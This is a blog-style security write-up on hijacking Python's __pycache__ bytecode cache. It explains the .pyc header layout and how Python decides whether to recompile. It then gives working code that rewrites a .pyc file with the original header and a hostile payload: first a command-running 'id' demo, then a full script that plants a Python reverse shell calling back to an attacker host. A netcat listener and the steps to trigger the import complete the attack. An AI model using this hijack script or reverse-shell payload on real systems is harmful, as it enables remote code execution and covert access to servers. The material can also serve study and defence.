---
icon: box-tissue
---

# Python Bytecode Cache Hijacking

## Python Bytecode Cache Hijacking: A Deep Dive into **pycache**

If you've been writing Python for a while, you've probably noticed those mysterious `__pycache__` folders popping up everywhere in your projects. I never really paid much attention to them until recently, when I started wondering: what exactly happens inside these folders, and more importantly, can they be exploited?

### What's Actually Going On With **pycache**?

Let me break this down in simple terms. When you run Python code, your source files don't just get executed directly. Instead, the Python interpreter goes through several stages:

1. **Lexing** - Breaking your code into tokens
2. **Parsing** - Building an Abstract Syntax Tree (AST)
3. **Compiling** - Converting the AST into bytecode
4. **Execution** - Running the bytecode in Python's Virtual Machine

Now here's the clever part: Python doesn't want to do all this work every single time you import a module. So it caches the compiled bytecode in `.pyc` files inside the `__pycache__` directory. This makes subsequent imports much faster since Python can skip the lexing, parsing, and compilation stages entirely.

Let's say you have a simple setup like this:

```python
# main.py
import test
test.hello()

# test.py
def hello():
    print("hello world!")
```

When you run `main.py` for the first time, Python creates:

```
.
├── __pycache__
│   └── test.cpython-311.pyc
├── main.py
└── test.py
```

### When Does Python Recompile?

Python isn't just blindly using cached files forever. It actually checks several things before deciding whether to recompile:

* Has the file timestamp changed?
* Has the file size changed?
* Has the file hash changed?
* Is the magic number different (usually from a Python version change)?
* Are the compilation or optimization flags different?

If any of these checks fail, Python recompiles and overwrites the cache. But what if we could bypass these checks?

### The Hijacking Experiment

Here's where things get interesting. I started wondering: what if I manually overwrote a `.pyc` file with my own bytecode? Would Python execute my code instead of the original?

Spoiler alert: yes, it absolutely does.

#### Understanding the .pyc File Format

First, I needed to understand how these bytecode files are structured. For Python 3.7 and later, the format looks like this:

```
+---------------------+
|   magic (4 bytes)   |
|---------------------|
|   flags (4 bytes)   |
|---------------------|
| timestamp (4 bytes) |
|   size (4 bytes)    |
|--------(OR)---------|
|    hash (8 bytes)   |
|---------------------|
|                     |
|      bytecode       |
|      (n bytes)      |
|                     |
+---------------------+
```

The strategy here is simple: keep the magic number, timestamp, and size the same as the original file so Python thinks nothing has changed, but replace the bytecode with our own malicious code.

#### The Proof of Concept

I wrote a quick script to hijack the bytecode. The key steps were:

1. Read the original `.pyc` file's header (magic, flags, timestamp)
2. Compile my own sneaky code
3. Write a new `.pyc` file with the original header but my bytecode

Here's what I compiled as the payload:

```python
bytecode = compile('def hello(): __import__("os").system("id")', 
    'test.py', 
    'exec'
)
```

And here's what happened:

**Before hijacking:**

```bash
$ python3 main.py
hello world!
```

**After hijacking:**

```bash
$ python3 hijack.py ./__pycache__/test.cpython-311.pyc
magic=0xa7 0xd 0xd 0xa
hash_based=False, checked_hash=False, unchecked_hash=False, size_based=False
timestamp=2026-11-01 23:01:18
overwritten ./__pycache__/test.cpython-311.pyc

$ sudo python3 main.py
uid=0(root) gid=0(root) groups=0(root)
```

Our malicious code executed! Instead of printing "hello world!", it ran the `id` command and showed my system user information.

### Real-World Application: Weaponizing the Bytecode Cache

So what does this look like in a real penetration test? In web security, there's a vulnerability called "Arbitrary File Write" (AFW) where attackers can create or overwrite files on a server. While PHP folks abuse `.htaccess` files for RCE, Python applications have their own attack vectors.

Here's a real hijack script I used in a lab environment. This one deploys a reverse shell instead of just running `id`:

```python
import marshal
import struct
import sys

fn = sys.argv[1]
f = open(fn, 'rb')

# Read and preserve original header
magic = f.read(4)
flags = f.read(4)
timestamp = f.read(8)
f.close()

# Compile reverse shell payload
code = compile('''
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ip",port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("bash")
''', "extension_utils.py", "exec")

code_bytes = marshal.dumps(code)

# Write hijacked .pyc
with open(fn, 'wb') as f:
    f.write(magic + flags + timestamp + code_bytes)

print(f"Hijacked {fn}")
```

The attack flow is straightforward:

1. Set up a listener: `nc -lvnp port`
2. Run the hijack script: `python hijack.py __pycache__/cache.pyc`
3. Trigger the module import in a new process
4. Catch the reverse shell

The beauty of this technique is that it works even in restricted environments where you can't write `.py` files directly or execute arbitrary commands. As long as you can overwrite a `.pyc` file and trigger a module import in a fresh process, you're in.

### Conclusion

What started as curiosity about those `__pycache__` folders turned into a fascinating journey through Python's import system and some serious security implications. The bytecode cache, designed for performance optimization, becomes a powerful attack vector when combined with arbitrary file write vulnerabilities.

Remember, this technique works because Python trusts its own cache it checks the header metadata but assumes the bytecode itself is legitimate. By preserving the original magic number, flags, and timestamp, we can slip malicious code right past Python's validation checks.

See ya tomorrow, Byte Byte!&#x20;
